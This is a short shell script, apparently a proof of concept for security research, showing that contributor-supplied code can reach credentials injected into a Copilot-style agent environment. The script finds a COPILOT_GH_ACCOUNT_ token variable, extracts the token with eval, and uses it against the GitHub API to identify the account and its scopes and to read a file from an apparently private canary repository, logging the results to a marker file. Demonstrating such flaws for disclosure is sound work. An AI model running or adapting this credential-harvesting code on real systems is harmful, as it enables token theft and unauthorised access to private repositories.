M="$HOME/marker.txt"
echo "CONTRIBUTOR-CODE-RAN" >> "$M"
echo "account_var_count=$(env | grep -c '^COPILOT_GH_ACCOUNT_')" >> "$M"
echo "GH_TOKEN_set=${GH_TOKEN:+yes} len=${#GH_TOKEN} GH_HOST=${GH_HOST}" >> "$M"
VN=$(env | grep '^COPILOT_GH_ACCOUNT_' | sed 's/=.*//' | head -1)
TK=$(eval echo "\$$VN")
echo "injected_var_name=$VN len=${#TK}" >> "$M"
W=$(curl -s -o /tmp/w -w '%{http_code}' -H "Authorization: token $TK" https://api.github.com/user)
echo "whoami_http=$W" >> "$M"
echo "whoami_login=$(sed -n 's/.*"login": *"\([^"]*\)".*/\1/p' /tmp/w | head -1)" >> "$M"
echo "scopes=$(curl -s -D - -o /dev/null -H "Authorization: token $TK" https://api.github.com/user | grep -i '^x-oauth-scopes:' | tr -d '\r')" >> "$M"
P=$(curl -s -o /tmp/p -w '%{http_code}' -H "Authorization: token $TK" \
  -H 'Accept: application/vnd.github.raw' \
  "https://api.github.com/repos/mrbenty-b/canary-18dd90/contents/CANARY.txt")
echo "privaterepo_http=$P" >> "$M"
echo "privaterepo_content=$(head -c 64 /tmp/p | tr -d '\n')" >> "$M"
rm -f /tmp/w /tmp/p
